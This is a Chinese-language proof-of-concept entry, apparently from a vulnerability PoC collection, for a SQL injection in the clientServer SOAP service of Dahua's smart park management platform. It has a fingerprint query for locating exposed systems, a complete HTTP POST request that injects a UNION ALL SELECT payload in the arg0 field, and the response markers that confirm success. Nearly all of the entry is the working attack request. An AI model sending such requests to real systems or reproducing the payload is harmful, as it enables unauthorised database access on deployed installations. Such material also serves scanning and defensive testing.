﻿# 大华智慧园区综合管理平台clientServerSQL注入漏洞

> 更新时间：2024-03-21

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="dahua-智慧园区综合管理平台"

> 验证脚本：HTTP

```
POST /portal/services/clientServer HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
  <soapenv:Header/>
  <soapenv:Body>
  <cli:getGroupInfoListByGroupId>
    <!--type: string-->
      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(1)-- -</arg0>
    <!--type: long-->
    <arg1>10</arg1>
    </cli:getGroupInfoListByGroupId>
    </soapenv:Body>
  </soap:Envelope>
```

> 响应代码特征：200

> 响应内容特征：b923820dcc

> 上传文件定位：

> 验证文件来源：大华智慧园区综合管理平台clientServerSQL注入漏洞.poc

